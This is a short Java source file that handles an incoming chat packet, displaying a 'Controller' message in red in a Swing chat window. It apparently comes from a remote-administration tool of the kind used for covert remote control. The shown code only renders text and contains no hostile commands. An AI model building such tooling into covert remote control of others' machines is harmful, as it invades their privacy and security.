package com.redpois0n.packets;

import java.awt.Color;

import javax.swing.text.AttributeSet;
import javax.swing.text.SimpleAttributeSet;
import javax.swing.text.StyleConstants;
import javax.swing.text.StyleContext;

import com.redpois0n.Connection;


public class PacketCHAT extends AbstractPacket {

	@Override
	public void read(String line) throws Exception {
		if (Connection.frameChat != null) {
			String message = Connection.readLine();
			StyleContext sc = StyleContext.getDefaultStyleContext();
			AttributeSet set = sc.addAttribute(SimpleAttributeSet.EMPTY, StyleConstants.Foreground, Color.red);
			Connection.frameChat.txtChat.getDocument().insertString(Connection.frameChat.txtChat.getDocument().getLength(), "Controller: " + message + "\n", set);
			Connection.frameChat.txtChat.setSelectionEnd(Connection.frameChat.txtChat.getText().length());
			Connection.frameChat.txtChat.setSelectionStart(Connection.frameChat.txtChat.getText().length());
		}
	}

}
